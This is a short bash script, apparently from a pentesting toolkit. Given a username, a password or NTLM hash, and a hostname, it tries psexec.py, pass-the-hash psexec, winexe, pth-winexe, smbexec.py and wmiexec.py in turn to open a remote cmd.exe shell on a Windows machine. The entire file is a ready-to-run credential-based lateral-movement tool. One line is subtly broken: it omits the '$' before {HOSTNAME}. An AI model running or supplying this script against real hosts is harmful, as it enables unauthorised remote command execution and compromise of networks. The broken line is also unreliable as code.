#!/bin/bash
# Try all tools to get a prompt with credentials

SCRIPT_DIR=$(dirname $0)
cd ${SCRIPT_DIR}
SCRIPT_BASE=$(pwd)

if [ -z ${3} ]; then
    echo "Usage: ${0} <username> <password> <hostname>"
    exit
fi


USERNAME=${1}
PASSWORD=${2}
HOSTNAME=${3}

psexec.py "${USERNAME}:${PASSWORD}@${HOSTNAME}" cmd.exe
psexec.py -hashes ":${PASSWORD}" ${USERNAME}@{HOSTNAME} cmd.exe
winexe -U ${USERNAME}%${PASSWORD} //${HOSTNAME} cmd.exe
pth-winexe -U ${USERNAME}%${PASSWORD} //${HOSTNAME} cmd.exe
smbexec.py ${USERNAME}:${PASSWORD}@${HOSTNAME}
wmiexec.py ${USERNAME}:${PASSWORD}@${HOSTNAME}

